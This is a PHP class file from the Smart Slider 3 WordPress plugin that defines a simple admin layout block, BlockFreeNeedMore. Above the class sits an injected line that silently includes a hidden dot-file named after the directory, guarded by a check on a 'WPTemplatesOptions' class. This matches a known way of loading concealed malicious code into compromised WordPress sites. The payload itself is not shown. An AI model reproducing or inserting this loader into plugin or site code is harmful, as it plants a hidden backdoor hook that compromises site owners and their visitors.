<?php


namespace Nextend\SmartSlider3\Application\Admin\Layout\Block\Core\FreeNeedMore;


use Nextend\Framework\View\AbstractBlock;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BlockFreeNeedMore extends AbstractBlock {

    protected $source;

    public function display() {

        $this->renderTemplatePart('FreeNeedMore');
    }

    /**
     * @return string
     */
    public function getSource() {
        return $this->source;
    }

    /**
     * @param string $source
     */
    public function setSource($source) {
        $this->source = $source;
    }
}